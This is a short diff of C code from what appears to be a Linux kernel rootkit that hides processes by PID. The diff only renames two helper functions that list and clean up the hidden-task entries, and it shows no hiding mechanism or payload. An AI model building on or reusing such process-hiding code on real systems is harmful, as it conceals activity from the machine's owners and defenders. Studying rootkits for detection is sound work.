@@ -107,7 +107,7 @@ void hide_task_by_pid(pid_t pid) {
 }
 
 void
-aft3rmath_data_cleanup(void) {
+ntsh_data_cleanup(void) {
     struct hidden_tasks_node *node, *next;
     list_for_each_entry_safe(node, next, &tasks_node, list)
     {
@@ -115,7 +115,7 @@ aft3rmath_data_cleanup(void) {
     }
 }
 
-void aft3rmath_list_saved_tasks(void) {
+void ntsh_list_saved_tasks(void) {
     struct hidden_tasks_node *node;
     list_for_each_entry(node, &tasks_node, list)
     {
